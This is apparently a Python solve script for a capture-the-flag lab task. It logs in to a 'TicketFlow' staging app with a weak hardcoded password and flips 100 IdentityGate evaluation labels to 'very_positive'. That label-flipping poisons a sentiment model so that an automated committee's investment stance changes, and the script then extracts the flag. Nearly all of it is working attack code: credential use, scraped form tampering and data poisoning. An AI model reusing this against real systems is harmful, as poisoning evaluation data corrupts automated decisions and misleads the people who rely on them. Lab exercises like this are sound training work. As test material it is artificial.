#!/usr/bin/env python3
"""COAE Task 2 - TicketFlow / IdentityGate sentiment manipulation (data poisoning / label flipping, module 302).
Login r.hale:passw0rd (weak onboarding passphrase) -> open archive request REQ-8813 review packet
(140 editable rows: 100 IdentityGate REV-IG-*, 40 decoy REV-DN-*; override budget 100) ->
flip all 100 IdentityGate eval rows negative->very_positive -> stage -> launch shadow run ->
committee stance for IdentityGate flips Increase->Heavy Invest -> flag in the promotion report.
Usage: BASE via --ip/--port ; run as: .venv/bin/python solve/tf_poison.py
"""
import re, sys, requests, argparse
def main():
    ap=argparse.ArgumentParser(); ap.add_argument("--ip",default="154.57.164.73"); ap.add_argument("--port",default="31374")
    ap.add_argument("--host",default="staging.phantomkernel.htb"); ap.add_argument("--user",default="r.hale"); ap.add_argument("--pw",default="passw0rd")
    a=ap.parse_args(); BASE=f"http://{a.ip}:{a.port}"; s=requests.Session(); s.headers.update({"Host":a.host})
    r=s.post(f"{BASE}/ticketflow/login",data={"username":a.user,"password":a.pw},allow_redirects=False)
    assert r.status_code==302 and s.cookies.get("session"), f"login failed: {r.status_code}"
    print("[+] logged in", a.user)
    rv=f"{BASE}/ticketflow/dashboard/archive/requests/REQ-8813/review"
    html=s.get(rv).text
    sels=re.findall(r'<select[^>]*name="(label_[A-Za-z0-9_-]+)"[^>]*>(.*?)</select>',html,re.S)
    form={}; ig=0
    for name,body in sels:
        cur=(re.search(r'<option value="([^"]+)"\s+selected',body) or [None,""])
        cur=cur.group(1) if hasattr(cur,'group') else ""
        if "REV-IG-" in name: form[name]="very_positive"; ig+=1
        else: form[name]=cur
    print(f"[+] flipping {ig} IdentityGate rows -> very_positive (budget 100), {len(form)} total fields")
    r=s.post(rv,data=form,allow_redirects=False); assert r.status_code==302, r.status_code
    print("[+] review staged ->", r.headers.get("Location"))
    r=s.post(f"{BASE}/ticketflow/dashboard/runs",data={},timeout=120); assert r.status_code==200
    link=re.search(r'/ticketflow/dashboard/runs/(RUN-[A-Za-z0-9_-]+)',r.text)
    rep=s.get(f"{BASE}/ticketflow/dashboard/runs/{link.group(1)}").text if link else r.text
    flag=re.search(r'Promotion reference\s*</[^>]+>\s*<[^>]+>\s*([A-Za-z0-9]{32})',rep) or re.search(r'\b([A-Za-z0-9]{32})\b',re.sub(r'<[^>]+>',' ',rep))
    stance=re.search(r"IdentityGate is now &#39;([^&]+)&#39;",rep)
    print("[+] IdentityGate stance now:", stance.group(1) if stance else "?")
    print("[+] FLAG:", flag.group(1) if flag else "NOT FOUND")
if __name__=="__main__": main()
